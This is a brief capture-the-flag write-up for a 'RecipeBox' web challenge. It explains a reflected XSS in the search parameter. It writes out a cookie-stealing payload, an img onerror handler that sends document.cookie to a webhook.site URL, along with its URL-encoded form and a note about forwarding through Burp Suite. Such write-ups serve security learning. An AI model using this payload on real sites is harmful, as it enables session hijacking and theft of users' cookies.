RecipeBox -> the program let you do two things: search for a recipe and ask for the check of an URL. The search box is not so useful, but the URL one it is. because the server perform a query for the search, we can pass a script as a query. For example, the url of the server with ?q=alert(1) will raise an alert.   so, an idea is to force a fetch to web hook, sending the session cookie.  this is the script that can send the cookie using the fetch <img src="x" onerror="fetch('https://webhook.site/49fe0673-5526-4ad8-96f3-ac43fae9093f/?flag='+document.cookie)">  we need to encode this in an URL format, using a simple tool online %3Cimg%20src%3D%22x%22%20onerror%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2F49fe0673-5526-4ad8-96f3-ac43fae9093f%2F%3Fflag%3D%27%2Bbtoa%28document.cookie%29%29%22%3E and then attack that as a query of our web site. We can forward the request using burp suite.

